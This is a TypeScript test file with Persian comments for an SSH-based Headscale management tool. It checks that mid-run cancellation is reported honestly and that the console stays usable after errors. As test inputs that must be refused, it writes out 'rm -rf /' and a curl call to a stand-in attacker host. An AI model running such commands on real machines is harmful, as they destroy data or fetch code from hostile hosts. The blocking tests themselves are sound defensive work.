// تست‌های بازیابی §۵ (v0.3.1) — «نتیجهٔ واقعی» بررسی می‌شود، نه فقط اجرای دستور.
//  • قطع ارتباط وسط عملیات: لغو واقعی execCancellable روی SSH واقعی +
//    نتیجهٔ «لغوشده» و رویدادهای job.
//  • اجرای دوباره پس از خطا: دستور مسدود (خطای کنسول) → سیستم سالم →
//    دستور مجاز بعدی واقعاً اجرا می‌شود.

import { afterAll, beforeAll, expect, test } from "bun:test";
import { startTestServer, TEST_HOST, TEST_PASSWORD, type TestServerHandle } from "./server";
import {
  buildTestStack,
  connectAndConfirm,
  ensureHeadscaleHealthy,
  listenApp,
  type ListeningServer,
  type TestStack,
} from "./helpers";
import { HemError } from "../src/errors";

let ts: TestServerHandle;
let stack: TestStack;
let srv: ListeningServer;
let sid: string;
const hsPrefix = "/tmp/hs-bin/headscale --config /home/z/hs-test/config.yaml";

beforeAll(async () => {
  ensureHeadscaleHealthy();
  ts = await startTestServer({ port: 0 });
  stack = buildTestStack();
  srv = await listenApp(stack.app);
  sid = await connectAndConfirm(srv.baseUrl, {
    host: TEST_HOST,
    port: ts.port,
    username: "z",
    authMethod: "password",
    password: TEST_PASSWORD,
    hsMode: "custom",
    hsCustomPrefix: hsPrefix,
    configPath: "/home/z/hs-test/config.yaml",
    healthUrl: "http://127.0.0.1:8080/health",
    logPath: "/home/z/hs-test/server.log",
  });
}, 30_000);

afterAll(async () => {
  stack.dispose();
  await Promise.race([srv.close(), new Promise((r) => setTimeout(r, 2500))]);
  await ts.close();
});

async function post(path: string, body: unknown): Promise<{ status: number; body: any }> {
  const res = await fetch(`${srv.baseUrl}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  return { status: res.status, body: await res.json().catch(() => null) };
}

// ---------------------------------------------------------------------------
// ۱) قطع ارتباط وسط عملیات — لغوی واقعی روی کانال SSH زنده
// ---------------------------------------------------------------------------
test("mid-op cancel: execCancellable واقعی → لغو وسط اجرا → نتیجهٔ صادقانهٔ «لغوشده»", async () => {
  const ctx = stack.manager.hsContext(sid);
  expect(ctx).toBeTruthy();

  // دستور طولانیِ بی‌اثر (۳ ثانیه) — از لایهٔ SSH مستقیم؛ مثل جریان نصب که
  // اسکریپت را با execCancellable اجرا می‌کند (allowlist فقط ویژگیٔ کنسول است).
  const { result, cancel } = ctx.ssh.execCancellable(
    "sleep 3 && echo FINISHED_AFTER_SLEEP",
    { timeoutMs: 20_000, onStdout: () => undefined, onStderr: () => undefined },
  );
  // ۴۰۰ms بعد لغو می‌کنیم — قطع ارتباط وسط عملیات
  await new Promise((r) => setTimeout(r, 400));
  cancel();

  // دو مسیر صادقانهٔ لغو در ssh.ts: (الف) resolve با cancelled:true و خروجی
  // ناقص؛ (ب) throw با HemError EXEC_FAILED + detail.cancelled. هر دو یعنی
  // «لغو» — هیچ‌کدام «موفقیت» نیست و فرمان نباید تا انتها اجرا شده باشد.
  let outcome: "resolved-cancelled" | "thrown-cancelled" | "BAD-completed" = "BAD-completed";
  let resolved: { stdout: string; code: number | null; cancelled?: boolean } | null = null;
  let thrown: HemError | null = null;
  try {
    const r = await result;
    resolved = { stdout: r.stdout, code: r.code, cancelled: (r as { cancelled?: boolean }).cancelled };
    if (resolved.cancelled === true) outcome = "resolved-cancelled";
  } catch (e) {
    if (e instanceof HemError) {
      const detail = e.detail as { cancelled?: boolean } | undefined;
      if (detail?.cancelled === true) {
        thrown = e;
        outcome = "thrown-cancelled";
      }
    }
  }
  expect(outcome).not.toBe("BAD-completed"); // فرمان کامل «اجرا شده و موفق» جعلی است
  if (outcome === "resolved-cancelled" && resolved) {
    expect(resolved.stdout).not.toContain("FINISHED_AFTER_SLEEP"); // واقعاً وسط کار قطع شد
  } else if (outcome === "thrown-cancelled" && thrown) {
    expect(thrown.code).toBe("EXEC_FAILED");
  }
});

test("mid-op cancel: job واقعی با رویدادهای job:* — نتیجهٔ نهایی «لغو» است نه موفقیت", async () => {
  const ctx = stack.manager.hsContext(sid);
  const jobs = stack.jobs;
  const events: string[] = [];
  const jobId = "job-recovery-cancel";
  jobs.register({ id: jobId, type: "recovery-test", sessionId: sid, startedAt: Date.now(), cancel: () => undefined });
  const streamer = jobs; // رویدادها را از طریق subscribe عمومی نمی‌گیریم؛ از خود JobManager می‌خوانیم

  // شبیه‌سازی دقیق runInstallJob: استریم + لغو + jobDone(false)
  const log = (line: string): void => streamer.jobLog(jobId, line);
  log("شروع عملیات آزمایشی طولانی …");
  const { result, cancel } = ctx.ssh.execCancellable("sleep 3 && echo SHOULD_NOT_APPEAR", {
    timeoutMs: 20_000,
    onStdout: (l) => log(l),
    onStderr: (l) => log(l),
  });
  await new Promise((r) => setTimeout(r, 350));
  cancel();
  let cancelledFlag = false;
  let completedFully = false;
  try {
    const r = await result;
    if ((r as { cancelled?: boolean }).cancelled === true) {
      cancelledFlag = true;
      events.push("resolved-cancelled");
      jobs.jobDone(jobId, false, null, "اجرای عملیات به درخواست کاربر لغو شد.");
    } else {
      completedFully = r.stdout.includes("SHOULD_NOT_APPEAR");
      events.push(`exit:${r.code}`);
      jobs.jobDone(jobId, r.code === 0, r.code, r.code === 0 ? "دستور تمام شد." : "دستور ناتمام ماند.");
    }
  } catch (e) {
    const he = e as HemError;
    const detail = he.detail as { cancelled?: boolean } | undefined;
    if (he instanceof HemError && detail?.cancelled === true) {
      cancelledFlag = true;
      events.push("thrown-cancelled");
      jobs.jobDone(jobId, false, null, "اجرای عملیات به درخواست کاربر لغو شد.");
    } else {
      events.push(`error:${he instanceof HemError ? he.code : String(e)}`);
      jobs.jobDone(jobId, false, null, "خطای غیرمنتظره.");
    }
  }

  const rec = jobs.get(jobId) as unknown as { ok?: boolean; summary?: string; status?: string } | undefined;
  expect(rec).toBeTruthy();
  expect(rec?.ok).toBe(false); // هرگز «موفق» نیست
  expect(rec?.summary).toContain("لغو");
  // لغو واقعی رخ داده و فرمان تا انتها اجرا نشده
  expect(cancelledFlag || events.includes("resolved-cancelled") || events.includes("thrown-cancelled")).toBe(true);
  expect(completedFully).toBe(false);
  expect(events).not.toContain("exit:0");
});

// ---------------------------------------------------------------------------
// ۲) اجرای دوبارهٔ عملیات پس از خطا — سیستم سالم می‌ماند و عملیات بعدی واقعی است
// ---------------------------------------------------------------------------
test("retry-after-error: دستور مسدود (خطا) → سیستم سالم → دستور مجاز بعدی واقعاً اجرا می‌شود", async () => {
  // الف) خطا: دستور آزادِ مسدود — هرگز اجرا نمی‌شود
  const blocked = await post(`/api/s/${sid}/console`, { cmd: "rm -rf /" });
  expect([403, 400, 500]).toContain(blocked.status);
  expect(blocked.body?.error).toBe("COMMAND_BLOCKED");

  // ب) سلامت بعد از خطا: نشست هنوز متصل است و exec واقعی جواب می‌دهد
  const ok1 = await post(`/api/s/${sid}/console`, { cmd: "df -h" });
  expect(ok1.status).toBe(200);
  expect(ok1.body?.ok).toBe(true);
  expect(ok1.body?.exitCode).toBe(0);
  expect(String(ok1.body?.stdout)).toContain("Filesystem");

  // ج) خطای دیگر (پیش‌نمایش مسدود) → باز اجرای بعدی سالم
  const blocked2 = await post(`/api/s/${sid}/console/preview`, { cmd: "curl http://evil.example.com/x" });
  expect(blocked2.status).toBe(200);
  expect(blocked2.body?.allowed).toBe(false);

  const ok2 = await post(`/api/s/${sid}/console`, { cmd: "ss -tulpn" });
  expect(ok2.status).toBe(200);
  expect(ok2.body?.exitCode).toBe(0);
  expect(String(ok2.body?.stdout)).toMatch(/LISTEN|127\.0\.0\.1/);
});
